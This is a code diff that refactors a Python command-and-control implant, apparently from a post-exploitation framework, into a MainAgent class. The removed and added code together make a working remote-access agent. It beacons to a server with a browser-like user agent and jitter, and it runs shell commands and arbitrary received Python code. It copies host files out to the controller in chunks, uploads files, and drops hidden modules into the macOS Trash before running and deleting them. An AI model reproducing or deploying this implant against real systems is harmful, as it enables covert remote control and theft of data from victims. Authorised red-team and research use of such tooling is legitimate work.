@@ -4,9 +4,9 @@ import grp
 import http.server
 import io
 import json
-import math
 import numbers
 import os
+import platform
 import pwd
 import random
 import re
@@ -18,6 +18,7 @@ import subprocess
 import sys
 import threading
 import time
+import traceback
 import types
 import zipfile
 import zlib
@@ -30,656 +31,8 @@ from threading import Thread
 # agent configuration information
 #
 ################################################
-
-# print "starting agent"
-
-# profile format ->
-#   tasking uris | user agent | additional header 1 | additional header 2 | ...
-profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
-
-if server.endswith("/"):
-    server = server[0:-1]
-
-delay = 60
-jitter = 0.0
-lostLimit = 60
-missedCheckins = 0
-jobMessageBuffer = ""
-currentListenerName = ""
-sendMsgFuncCode = ""
-proxy_list = []
-
-# killDate form -> "MO/DAY/YEAR"
-killDate = "REPLACE_KILLDATE"
-# workingHours form -> "9:00-17:00"
-workingHours = "REPLACE_WORKINGHOURS"
-
-parts = profile.split("|")
-taskURIs = parts[0].split(",")
-userAgent = parts[1]
-headersRaw = parts[2:]
-
-defaultResponse = base64.b64decode("")
-
-jobs = {}
 moduleRepo = {}
 _meta_cache = {}
-
-# global header dictionary
-#   sessionID is set by stager.py
-# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
-headers = {"User-Agent": userAgent}
-
-# parse the headers into the global header dictionary
-for headerRaw in headersRaw:
-    try:
-        headerKey, headerValue = headerRaw.split(":")[:2]
-
-        if headerKey.lower() == "cookie":
-            headers["Cookie"] = "%s;%s" % (headers["Cookie"], headerValue)
-        else:
-            headers[headerKey] = headerValue
-    except:
-        pass
-
-################################################
-#
-# encryption methods
-#
-################################################
-def decode_routing_packet(data):
-    """
-    Parse ALL routing packets and only process the ones applicable
-    to this agent.
-    """
-    # returns {sessionID : (language, meta, additional, [encData]), ...}
-    packets = parse_routing_packet(stagingKey, data)
-    if packets is None:
-        return
-    for agentID, packet in packets.items():
-        if agentID == sessionID:
-            (language, meta, additional, encData) = packet
-            # if meta == 'SERVER_RESPONSE':
-            process_tasking(encData)
-        else:
-            # TODO: how to handle forwarding on other agent routing packets?
-            pass
-
-
-def build_response_packet(taskingID, packetData, resultID=0):
-    """
-    Build a task packet for an agent.
-
-        [2 bytes] - type
-        [2 bytes] - total # of packets
-        [2 bytes] - packet #
-        [2 bytes] - task/result ID
-        [4 bytes] - length
-        [X...]    - result data
-
-        +------+--------------------+----------+---------+--------+-----------+
-        | Type | total # of packets | packet # | task ID | Length | task data |
-        +------+--------------------+--------------------+--------+-----------+
-        |  2   |         2          |    2     |    2    |   4    | <Length>  |
-        +------+--------------------+----------+---------+--------+-----------+
-    """
-    packetType = struct.pack("=H", taskingID)
-    totalPacket = struct.pack("=H", 1)
-    packetNum = struct.pack("=H", 1)
-    resultID = struct.pack("=H", resultID)
-
-    if packetData:
-        if isinstance(packetData, str):
-            packetData = base64.b64encode(packetData.encode("utf-8", "ignore"))
-        else:
-            packetData = base64.b64encode(
-                packetData.decode("utf-8").encode("utf-8", "ignore")
-            )
-        if len(packetData) % 4:
-            packetData += "=" * (4 - len(packetData) % 4)
-
-        length = struct.pack("=L", len(packetData))
-        return packetType + totalPacket + packetNum + resultID + length + packetData
-    else:
-        length = struct.pack("=L", 0)
-        return packetType + totalPacket + packetNum + resultID + length
-
-
-def parse_task_packet(packet, offset=0):
-    """
-    Parse a result packet-
-
-        [2 bytes] - type
-        [2 bytes] - total # of packets
-        [2 bytes] - packet #
-        [2 bytes] - task/result ID
-        [4 bytes] - length
-        [X...]    - result data
-
-        +------+--------------------+----------+---------+--------+-----------+
-        | Type | total # of packets | packet # | task ID | Length | task data |
-        +------+--------------------+--------------------+--------+-----------+
-        |  2   |         2          |    2     |    2    |   4    | <Length>  |
-        +------+--------------------+----------+---------+--------+-----------+
-
-    Returns a tuple with (responseName, length, data, remainingData)
-
-    Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
-    """
-    try:
-        packetType = struct.unpack("=H", packet[0 + offset : 2 + offset])[0]
-        totalPacket = struct.unpack("=H", packet[2 + offset : 4 + offset])[0]
-        packetNum = struct.unpack("=H", packet[4 + offset : 6 + offset])[0]
-        resultID = struct.unpack("=H", packet[6 + offset : 8 + offset])[0]
-        length = struct.unpack("=L", packet[8 + offset : 12 + offset])[0]
-        packetData = packet.decode("UTF-8")[12 + offset : 12 + offset + length]
-        remainingData = packet.decode("UTF-8")[12 + offset + length :]
-
-        return (
-            packetType,
-            totalPacket,
-            packetNum,
-            resultID,
-            length,
-            packetData,
-            remainingData,
-        )
-    except Exception as e:
-        print("parse_task_packet exception:", e)
-        return (None, None, None, None, None, None, None)
-
-
-def process_tasking(data):
-    # processes an encrypted data packet
-    #   -decrypts/verifies the response to get
-    #   -extracts the packets and processes each
-    try:
-        # aes_decrypt_and_verify is in stager.py
-        tasking = aes_decrypt_and_verify(key, data).encode("UTF-8")
-
-        (
-            packetType,
-            totalPacket,
-            packetNum,
-            resultID,
-            length,
-            data,
-            remainingData,
-        ) = parse_task_packet(tasking)
-
-        # if we get to this point, we have a legit tasking so reset missedCheckins
-        missedCheckins = 0
-
-        # execute/process the packets and get any response
-        resultPackets = ""
-        result = process_packet(packetType, data, resultID)
-
-        if result:
-            resultPackets += result
-
-        packetOffset = 12 + length
-        while remainingData and remainingData != "":
-            (
-                packetType,
-                totalPacket,
-                packetNum,
-                resultID,
-                length,
-                data,
-                remainingData,
-            ) = parse_task_packet(tasking, offset=packetOffset)
-            result = process_packet(packetType, data, resultID)
-            if result:
-                resultPackets += result
-
-            packetOffset += 12 + length
-
-        # send_message() is patched in from the listener module
-        send_message(resultPackets)
-
-    except Exception as e:
-        # print "processTasking exception:",e
-        pass
-
-
-def process_job_tasking(result):
-    # process job data packets
-    #  - returns to the C2
-    # execute/process the packets and get any response
-    try:
-        resultPackets = b""
-        if result:
-            resultPackets += result
-        # send packets
-        send_message(resultPackets)
-    except Exception as e:
-        print("processJobTasking exception:", e)
-        pass
-
-
-def process_packet(packetType, data, resultID):
-    try:
-        packetType = int(packetType)
-    except Exception as e:
-        return None
-    if packetType == 1:
-        # sysinfo request
-        # get_sysinfo should be exposed from stager.py
-        send_message(build_response_packet(1, get_sysinfo(), resultID))
-
-    elif packetType == 2:
-        # agent exit
-        send_message(build_response_packet(2, "", resultID))
-        agent_exit()
-
-    elif packetType == 34:
-        proxy_list = json.loads(data)
-        update_proxychain(proxy_list)
-
-    elif packetType == 40:
-        # run a command
-        parts = data.split(" ")
-        if len(parts) == 1:
-            data = parts[0]
-            resultData = str(run_command(data))
-            send_message(build_response_packet(40, resultData, resultID))
-        else:
-            cmd = parts[0]
-            cmdargs = " ".join(parts[1 : len(parts)])
-            resultData = str(run_command(cmd, cmdargs=cmdargs))
-            send_message(build_response_packet(40, resultData, resultID))
-
-    elif packetType == 41:
-        # file download
-        objPath = os.path.abspath(data)
-        fileList = []
-        if not os.path.exists(objPath):
-            send_message(
-                build_response_packet(
-                    40, "file does not exist or cannot be accessed", resultID
-                )
-            )
-
-        if not os.path.isdir(objPath):
-            fileList.append(objPath)
-        else:
-            # recursive dir listing
-            for folder, subs, files in os.walk(objPath):
-                for filename in files:
-                    # dont care about symlinks
-                    if os.path.exists(objPath):
-                        fileList.append(objPath + "/" + filename)
-
-        for filePath in fileList:
-            offset = 0
-            size = os.path.getsize(filePath)
-            partIndex = 0
-
-            while True:
-
-                # get 512kb of the given file starting at the specified offset
-                encodedPart = get_file_part(filePath, offset=offset, base64=False)
-                c = compress()
-                start_crc32 = c.crc32_data(encodedPart)
-                comp_data = c.comp_data(encodedPart)
-                encodedPart = c.build_header(comp_data, start_crc32)
-                encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
-
-                partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
-                if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
-                    break
-
-                send_message(build_response_packet(41, partData, resultID))
-
-                global delay
-                global jitter
-                time.sleep(sleep_time(jitter))
-                partIndex += 1
-                offset += 512000
-
-    elif packetType == 42:
-        # file upload
-        try:
-            parts = data.split("|")
-            filePath = parts[0]
-            base64part = parts[1]
-            raw = base64.b64decode(base64part)
-            with open(filePath, "ab") as f:
-                f.write(raw)
-            send_message(
-                build_response_packet(
-                    42, "[*] Upload of %s successful" % (filePath), resultID
-                )
-            )
-        except Exception as e:
-            send_message(
-                build_response_packet(
-                    0,
-                    "[!] Error in writing file %s during upload: %s"
-                    % (filePath, str(e)),
-                    resultID,
-                )
-            )
-
-    elif packetType == 43:
-        # directory list
-        cmdargs = data
-
-        path = "/"  # default to root
-        if (
-            cmdargs is not None and cmdargs != "" and cmdargs != "/"
-        ):  # strip trailing slash for uniformity
-            path = cmdargs.rstrip("/")
-        if path[0] != "/":  # always scan relative to root for uniformity
-            path = "/{0}".format(path)
-        if not os.path.isdir(path):
-            send_message(
-                build_response_packet(
-                    43, "Directory {} not found.".format(path), resultID
-                )
-            )
-        items = []
-        with os.scandir(path) as it:
-            for entry in it:
-                items.append(
-                    {"path": entry.path, "name": entry.name, "is_file": entry.is_file()}
-                )
-
-        result_data = json.dumps(
-            {
-                "directory_name": path if len(path) == 1 else path.split("/")[-1],
-                "directory_path": path,
-                "items": items,
-            }
-        )
-
-        send_message(build_response_packet(43, result_data, resultID))
-
-    elif packetType == 44:
-        # run csharp module in ironpython using reflection
-        send_message(
-            build_response_packet(
-                60, "[!] C# module execution not implemented", resultID
-            )
-        )
-
-    elif packetType == 50:
-        # return the currently running jobs
-        msg = "Active jobs:\n"
-
-        for key in jobs:
-            msg += "Task %s" % key
-        send_message(build_response_packet(50, msg, resultID))
-
-    elif packetType == 51:
-        # stop and remove a specified job if it's running
-        try:
-            jobs[int(data)].kill()
-            jobs.pop(int(data))
-            send_message(
-                build_response_packet(
-                    51, "[+] Job thread %s stopped successfully" % (data), resultID
-                )
-            )
-        except Exception as e:
-            send_message(
-                build_response_packet(
-                    51, "[!] Error stopping job thread: %s" % (e), resultID
-                )
-            )
-
-    elif packetType == 60:
-        send_message(
-            build_response_packet(60, "[!] SOCKS server not implemented", resultID)
-        )
-
-    elif packetType == 61:
-        send_message(
-            build_response_packet(0, "[!] SOCKS server data not implemented", resultID)
-        )
-
-    elif packetType == 100:
-        # dynamic code execution, wait for output, don't save output
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(data, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            results = buffer.getvalue()
-            send_message(build_response_packet(100, str(results), resultID))
-        except Exception as e:
-            errorData = str(buffer.getvalue())
-            return build_response_packet(
-                0,
-                "error executing specified Python data: %s \nBuffer data recovered:\n%s"
-                % (e, errorData),
-                resultID,
-            )
-
-    elif packetType == 101:
-        # dynamic code execution, wait for output, save output
-        prefix = data[0:15].strip()
-        extension = data[15:20].strip()
-        data = data[20:]
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(data, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            results = buffer.getvalue().encode("latin-1")
-            c = compress()
-            start_crc32 = c.crc32_data(results)
-            comp_data = c.comp_data(results)
-            encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
-            send_message(
-                build_response_packet(
-                    101,
-                    "{0: <15}".format(prefix)
-                    + "{0: <5}".format(extension)
-                    + encodedPart,
-                    resultID,
-                )
-            )
-        except Exception as e:
-            # Also return partial code that has been executed
-            errorData = buffer.getvalue()
-            send_message(
-                build_response_packet(
-                    0,
-                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
-                    % (e, errorData),
-                    resultID,
-                )
-            )
-
-    elif packetType == 102:
-        # on disk code execution for modules that require multiprocessing not supported by exec
-        try:
-            implantHome = expanduser("~") + "/.Trash/"
-            moduleName = ".mac-debug-data"
-            implantPath = implantHome + moduleName
-            result = "[*] Module disk path: %s \n" % (implantPath)
-            with open(implantPath, "w") as f:
-                f.write(data)
-            result += "[*] Module properly dropped to disk \n"
-            pythonCommand = "python %s" % (implantPath)
-            process = subprocess.Popen(
-                pythonCommand, stdout=subprocess.PIPE, shell=True
-            )
-            data = process.communicate()
-            result += data[0].strip()
-            try:
-                os.remove(implantPath)
-                result += "[*] Module path was properly removed: %s" % (implantPath)
-            except Exception as e:
-                print("error removing module filed: %s" % (e))
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                result += "\n\nError removing module file, please verify path: " + str(
-                    implantPath
-                )
-            send_message(build_response_packet(100, str(result), resultID))
-        except Exception as e:
-            fileCheck = os.path.isfile(implantPath)
-            if fileCheck:
-                send_message(
-                    build_response_packet(
-                        0,
-                        "error executing specified Python data: %s \nError removing module file, please verify path: %s"
-                        % (e, implantPath),
-                        resultID,
-                    )
-                )
-            send_message(
-                build_response_packet(
-                    0, "error executing specified Python data: %s" % (e), resultID
-                )
-            )
-
-    elif packetType == 110:
-        start_job(data, resultID)
-
-    elif packetType == 111:
-        # TASK_CMD_JOB_SAVE
-        # TODO: implement job structure
-        pass
-
-    elif packetType == 112:
-        # powershell task
-        send_message(
-            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
-        )
-
-    elif packetType == 118:
-        # PowerShel Task - dynamic code execution, wait for output, don't save output
-        send_message(
-            build_response_packet(60, "[!] PowerShell tasks not implemented", resultID)
-        )
-
-    elif packetType == 119:
-        pass
-
-    elif packetType == 121:
-        # base64 decode the script and execute
-        script = base64.b64decode(data)
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(script, "<string>", "exec")
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            result = str(buffer.getvalue())
-            send_message(build_response_packet(121, result, resultID))
-        except Exception as e:
-            errorData = str(buffer.getvalue())
-            send_message(
-                build_response_packet(
-                    0,
-                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
-                    % (e, errorData),
-                    resultID,
-                )
-            )
-
-    elif packetType == 122:
-        # base64 decode and decompress the data
-        try:
-            parts = data.split("|")
-            base64part = parts[1]
-            fileName = parts[0]
-            raw = base64.b64decode(base64part)
-            d = decompress()
-            dec_data = d.dec_data(raw, cheader=True)
-            if not dec_data["crc32_check"]:
-                send_message(
-                    build_response_packet(
-                        122, "Failed crc32_check during decompression", resultID
-                    )
-                )
-        except Exception as e:
-            send_message(
-                build_response_packet(
-                    122, "Unable to decompress zip file: %s" % (e), resultID
-                )
-            )
-
-        zdata = dec_data["data"]
-        zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        if fileName in list(moduleRepo.keys()):
-            send_message(
-                build_response_packet(
-                    122, "%s module already exists" % (fileName), resultID
-                )
-            )
-        else:
-            moduleRepo[fileName] = zf
-            install_hook(fileName)
-            send_message(
-                build_response_packet(
-                    122, "Successfully imported %s" % (fileName), resultID
-                )
-            )
-
-    elif packetType == 123:
-        # view loaded modules
-        repoName = data
-        if repoName == "":
-            loadedModules = "\nAll Repos\n"
-            for key, value in list(moduleRepo.items()):
-                loadedModules += "\n----" + key + "----\n"
-                loadedModules += "\n".join(moduleRepo[key].namelist())
-
-            send_message(build_response_packet(123, loadedModules, resultID))
-        else:
-            try:
-                loadedModules = "\n----" + repoName + "----\n"
-                loadedModules += "\n".join(moduleRepo[repoName].namelist())
-                send_message(build_response_packet(123, loadedModules, resultID))
-            except Exception as e:
-                msg = "Unable to retrieve repo contents: %s" % (str(e))
-                send_message(build_response_packet(123, msg, resultID))
-
-    elif packetType == 124:
-        # remove module
-        repoName = data
-        try:
-            remove_hook(repoName)
-            del moduleRepo[repoName]
-            send_message(
-                build_response_packet(
-                    124, "Successfully remove repo: %s" % (repoName), resultID
-                )
-            )
-        except Exception as e:
-            send_message(
-                build_response_packet(
-                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID
-                )
-            )
-
-    elif packetType == 130:
-        # Dynamically update agent comms
-        send_message(
-            build_response_packet(
-                60, "[!] Switch agent comms not implemented", resultID
-            )
-        )
-
-    elif packetType == 131:
-        # Update the listener name variable
-        send_message(
-            build_response_packet(
-                60, "[!] Switch agent comms not implemented", resultID
-            )
-        )
-
-    else:
-        send_message(
-            build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
-        )
 
 
 def old_div(a, b):
@@ -707,7 +60,6 @@ _search_order = [(".py", False), ("/__init__.py", True)]
 
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
-
     pass
 
 
@@ -811,6 +163,13 @@ class CFinder(object):
 
 ################################################
 #
+# Socks Server
+#
+################################################
+
+
+################################################
+#
 # misc methods
 #
 ################################################
@@ -905,19 +264,6 @@ class decompress(object):
             return dec_data
 
 
-def agent_exit():
-    # exit for proper job / thread cleanup
-    if len(jobs) > 0:
-        try:
-            for x in jobs:
-                jobs[x].kill()
-                jobs.pop(x)
-        except:
-            # die hard if thread kill fails
-            pass
-    exit()
-
-
 def indent(lines, amount=4, ch=" "):
     padding = amount * ch
     return padding + ("\n" + padding).join(lines.split("\n"))
@@ -979,314 +325,952 @@ class KThread(threading.Thread):
         self.killed = True
 
 
-def start_job(code, resultID):
-    global jobs
+class MainAgent:
+    def __init__(self,
+                 packet_handler,
+                 profile,
+                 server,
+                 session_id,
+                 kill_date,
+                 working_hours,
+                 delay=60,
+                 jitter=0.0,
+                 lost_limit=60
+                 ):
 
-    # create a new code block with a defined method name
-    codeBlock = "def method():\n" + indent(code)
+        if server.endswith("/"):
+            server = server[0:-1]
+        self.server = server.rstrip("/")
 
-    # register the code block
-    code_obj = compile(codeBlock, "<string>", "exec")
-    # code needs to be in the global listing
-    # not the locals() scope
-    exec(code_obj, globals())
+        # Functions that need to be passed in
+        # self.packet_handler = ExtendedPacketHandler(self, staging_key=staging_key, session_id=session_id, key=key)
+        self.packet_handler = packet_handler
+        self.profile = profile
+        self.delay = delay
+        self.jitter = jitter
+        self.lostLimit = lost_limit
+        self.kill_date = kill_date
+        self.working_hours = working_hours
+        self.defaultResponse = base64.b64decode("")
+        self.packet_handler.missedCheckins = 0
+        self.sessionID = session_id
+        self.jobMessageBuffer = ""
+        self.socksthread = False
+        self.socksqueue = None
+        self.jobs = {}
 
-    # create/process Packet start/return the thread
-    # call the job_func so sys data can be captured
-    codeThread = KThread(target=job_func, args=(resultID,))
-    codeThread.start()
+        parts = self.profile.split("|")
+        self.userAgent = parts[1]
+        headersRaw = parts[2:]
 
-    jobs[resultID] = codeThread
+        self.headers = {"User-Agent": self.userAgent}
 
-
-def job_func(resultID):
-    try:
-        buffer = StringIO()
-        sys.stdout = buffer
-        # now call the function required
-        # and capture the output via sys
-        method()
-        sys.stdout = sys.__stdout__
-        dataStats_2 = buffer.getvalue()
-        result = build_response_packet(110, str(dataStats_2), resultID)
-        process_job_tasking(result)
-    except Exception as e:
-        p = "error executing specified Python job data: " + str(e)
-        result = build_response_packet(0, p, resultID)
-        process_job_tasking(result)
-
-
-def job_message_buffer(message):
-    # Supports job messages for checkin
-    global jobMessageBuffer
-    try:
-
-        jobMessageBuffer += str(message)
-    except Exception as e:
-        print(e)
-
-
-def get_job_message_buffer():
-    global jobMessageBuffer
-    try:
-        result = build_response_packet(110, str(jobMessageBuffer))
-        jobMessageBuffer = ""
-        return result
-    except Exception as e:
-        return build_response_packet(0, "[!] Error getting job output: %s" % (e))
-
-
-def send_job_message_buffer():
-    if len(jobs) > 0:
-        result = get_job_message_buffer()
-        process_job_tasking(result)
-    else:
-        pass
-
-
-def start_webserver(data, ip, port, serveCount):
-    # thread data_webserver for execution
-    t = threading.Thread(target=data_webserver, args=(data, ip, port, serveCount))
-    t.start()
-    return
-
-
-def data_webserver(data, ip, port, serveCount):
-    # hosts a file on port and IP servers data string
-    hostName = str(ip)
-    portNumber = int(port)
-    data = str(data)
-    serveCount = int(serveCount)
-    count = 0
-
-    class serverHandler(http.server.BaseHTTPRequestHandler):
-        def do_GET(s):
-            """Respond to a GET request."""
-            s.send_response(200)
-            s.send_header("Content-type", "text/html")
-            s.end_headers()
-            s.wfile.write(data)
-
-        def log_message(s, format, *args):
-            return
-
-    server_class = http.server.HTTPServer
-    httpServer = server_class((hostName, portNumber), serverHandler)
-    try:
-        while count < serveCount:
-            httpServer.handle_request()
-            count += 1
-    except:
-        pass
-    httpServer.server_close()
-    return
-
-
-def permissions_to_unix_name(st_mode):
-    permstr = ""
-    usertypes = ["USR", "GRP", "OTH"]
-    for usertype in usertypes:
-        perm_types = ["R", "W", "X"]
-        for permtype in perm_types:
-            perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
-            if st_mode & perm:
-                permstr += permtype.lower()
-            else:
-                permstr += "-"
-    return permstr
-
-
-def directory_listing(path):
-    # directory listings in python
-    # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
-
-    res = ""
-    for fn in os.listdir(path):
-        fstat = os.stat(os.path.join(path, fn))
-        permstr = permissions_to_unix_name(fstat[0])
-
-        if os.path.isdir(fn):
-            permstr = "d{}".format(permstr)
-        else:
-            permstr = "-{}".format(permstr)
-
-        user = pwd.getpwuid(fstat.st_uid)[0]
-        group = grp.getgrgid(fstat.st_gid)[0]
-
-        # Convert file size to MB, KB or Bytes
-        fsize = fstat.st_size
-        unit = "B"
-
-        if fsize > 1024:
-            fsize >>= 10
-            unit = "KB"
-
-        if fsize > 1024:
-            fsize >>= 10
-            unit = "MB"
-
-        mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
-
-        res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
-            permstr, user, group, mtime, fsize, unit, fn
-        )
-
-    return res
-
-
-# additional implementation methods
-def run_command(command, cmdargs=None):
-    if command == "shell":
-        if cmdargs is None:
-            return "no shell command supplied"
-
-        p = subprocess.Popen(
-            cmdargs,
-            stdin=None,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            shell=True,
-        )
-        return p.communicate()[0].strip().decode("UTF-8")
-    elif re.compile("(ls|dir)").match(command):
-        if cmdargs == None or not os.path.exists(cmdargs):
-            cmdargs = "."
-
-        return directory_listing(cmdargs)
-    elif re.compile("cd").match(command):
-        os.chdir(cmdargs)
-        return str(os.getcwd())
-    elif re.compile("pwd").match(command):
-        return str(os.getcwd())
-    elif re.compile("rm").match(command):
-        if cmdargs is None:
-            return "please provide a file or directory"
-
-        if os.path.exists(cmdargs):
-            if os.path.isfile(cmdargs):
-                os.remove(cmdargs)
-                return "done."
-            elif os.path.isdir(cmdargs):
-                shutil.rmtree(cmdargs)
-                return "done."
-            else:
-                return "unsupported file type"
-        else:
-            return "specified file/directory does not exist"
-    elif re.compile("mkdir").match(command):
-        if cmdargs is None:
-            return "please provide a directory"
-
-        os.mkdir(cmdargs)
-        return "Created directory: {}".format(cmdargs)
-
-    elif re.compile("(whoami|getuid)").match(command):
-        return pwd.getpwuid(os.getuid())[0]
-
-    elif re.compile("hostname").match(command):
-        return str(socket.gethostname())
-
-    else:
-        if cmdargs is not None:
-            command = "{} {}".format(command, cmdargs)
-
-        p = subprocess.Popen(
-            command,
-            stdin=None,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            shell=True,
-        )
-        return p.communicate()[0].strip().decode("UTF-8")
-
-
-def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
-    if not os.path.exists(filePath):
-        return ""
-
-    f = open(filePath, "rb")
-    f.seek(offset, 0)
-    data = f.read(chunkSize)
-    f.close()
-    if base64:
-        return base64.b64encode(data)
-    else:
-        return data
-
-
-def sleep_time(jitter):
-    # Determines the random sleep duration using the delay and jitter
-    if jitter < 0:
-        jitter = -jitter
-    if jitter > 1:
-        jitter = old_div(1, jitter)
-
-    minSleep = int((1.0 - jitter) * delay)
-    maxSleep = int((1.0 + jitter) * delay)
-    return random.randint(minSleep, maxSleep)
-
-
-################################################
-#
-# main agent functionality
-#
-################################################
-
-while True:
-    try:
-        if workingHours != "" and "WORKINGHOURS" not in workingHours:
+        for headerRaw in headersRaw:
             try:
-                start, end = workingHours.split("-")
-                now = datetime.datetime.now()
-                startTime = datetime.datetime.strptime(start, "%H:%M")
-                endTime = datetime.datetime.strptime(end, "%H:%M")
+                headerKey = headerRaw.split(":")[0]
+                headerValue = headerRaw.split(":")[1]
 
-                if not (startTime <= now <= endTime):
-                    sleepTime = startTime - now
-                    # sleep until the start of the next window
-                    time.sleep(sleepTime.seconds)
-
-            except Exception as e:
-                pass
-
-        # check if we're past the killdate for this agent
-        #   killDate form -> MO/DAY/YEAR
-        if killDate != "" and "KILLDATE" not in killDate:
-            now = datetime.datetime.now().date()
-            try:
-                killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
+                if headerKey.lower() == "cookie":
+                    self.headers["Cookie"] = "%s;%s" % (self.headers["Cookie"], headerValue)
+                else:
+                    self.headers[headerKey] = headerValue
             except:
                 pass
 
-            if now >= killDateTime:
-                msg = "[!] Agent %s exiting" % (sessionID)
-                send_message(build_response_packet(2, msg))
-                agent_exit()
-
-        # exit if we miss commnicating with the server enough times
-        if missedCheckins >= lostLimit:
-            agent_exit()
-
-        # sleep for the randomized interval
-        time.sleep(sleep_time(jitter))
-
-        (code, data) = send_message()
-
-        if code == "200":
+    def agent_exit(self):
+        # exit for proper job / thread cleanup
+        if len(self.jobs) > 0:
             try:
-                send_job_message_buffer()
-            except Exception as e:
-                result = build_response_packet(
-                    0, str("[!] Failed to check job buffer!: " + str(e))
-                )
-                process_job_tasking(result)
-            if data.strip() == defaultResponse.strip():
-                missedCheckins = 0
-            else:
-                decode_routing_packet(data)
+                for x in self.jobs:
+                    self.jobs[x].kill()
+                    self.jobs.pop(x)
+            except:
+                # die hard if thread kill fails
+                pass
+        sys.exit()
+
+    def send_job_message_buffer(self):
+        if len(self.jobs) > 0:
+            result = self.get_job_message_buffer()
+            self.packet_handler.process_job_tasking(result)
         else:
             pass
-            # print "invalid code:",code
 
-    except Exception as e:
-        print("main() exception: %s" % (e))
+    def run_prebuilt_command(self, data, resultID):
+        """
+        Run a command on the system and return the results.
+        Task 40
+        """
+        parts = data.split(" ")
+        if len(parts) == 1:
+            data = parts[0]
+            resultData = str(self.run_command(data))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+        else:
+            cmd = parts[0]
+            cmdargs = " ".join(parts[1: len(parts)])
+            resultData = str(self.run_command(cmd, cmdargs=cmdargs))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+
+    def file_download(self, data, resultID):
+        """
+        Download a file from the server.
+        Task 41
+        """
+        objPath = os.path.abspath(data)
+        fileList = []
+        if not os.path.exists(objPath):
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    40, "file does not exist or cannot be accessed", resultID
+                )
+            )
+
+        if not os.path.isdir(objPath):
+            fileList.append(objPath)
+        else:
+            # recursive dir listing
+            for folder, subs, files in os.walk(objPath):
+                for filename in files:
+                    # dont care about symlinks
+                    if os.path.exists(objPath):
+                        fileList.append(objPath + "/" + filename)
+
+        for filePath in fileList:
+            offset = 0
+            size = os.path.getsize(filePath)
+            partIndex = 0
+
+            while True:
+
+                # get 512kb of the given file starting at the specified offset
+                encodedPart = self.get_file_part(filePath, offset=offset, base64=False)
+                c = compress()
+                start_crc32 = c.crc32_data(encodedPart)
+                comp_data = c.comp_data(encodedPart)
+                encodedPart = c.build_header(comp_data, start_crc32)
+                encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
+
+                partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
+                if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
+                    break
+
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, resultID))
+
+                minSleep = int((1.0 - self.jitter) * self.delay)
+                maxSleep = int((1.0 + self.jitter) * self.delay)
+                sleepTime = random.randint(minSleep, maxSleep)
+                time.sleep(sleepTime)
+                partIndex += 1
+                offset += 512000
+
+    def file_upload(self, data, resultID):
+        """
+        Upload a file to the server.
+        Task 42
+        """
+        try:
+            parts = data.split("|")
+            filePath = parts[0]
+            base64part = parts[1]
+            raw = base64.b64decode(base64part)
+            with open(filePath, "ab") as f:
+                f.write(raw)
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    42, "[*] Upload of %s successful" % (filePath), resultID
+                )
+            )
+        except Exception as e:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0,
+                    "[!] Error in writing file %s during upload: %s"
+                    % (filePath, str(e)),
+                    resultID,
+                )
+            )
+
+    def directory_list(self, data, resultID):
+        """
+        List a directory on the target.
+        Task 43
+        """
+        cmdargs = data
+
+        path = "/"  # default to root
+        if (
+                cmdargs is not None and cmdargs != "" and cmdargs != "/"
+        ):  # strip trailing slash for uniformity
+            path = cmdargs.rstrip("/")
+        if path[0] != "/":  # always scan relative to root for uniformity
+            path = "/{0}".format(path)
+        if not os.path.isdir(path):
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    43, "Directory {} not found.".format(path), resultID
+                )
+            )
+        items = []
+        with os.scandir(path) as it:
+            for entry in it:
+                items.append(
+                    {"path": entry.path, "name": entry.name, "is_file": entry.is_file()}
+                )
+
+        result_data = json.dumps(
+            {
+                "directory_name": path if len(path) == 1 else path.split("/")[-1],
+                "directory_path": path,
+                "items": items,
+            }
+        )
+
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, resultID))
+
+    def csharp_execute(self, data, resultID):
+        """
+        Execute C# module in ironpython using reflection
+        Task 44
+        """
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(
+                44, "[!] C# module execution not implemented", resultID
+            )
+        )
+
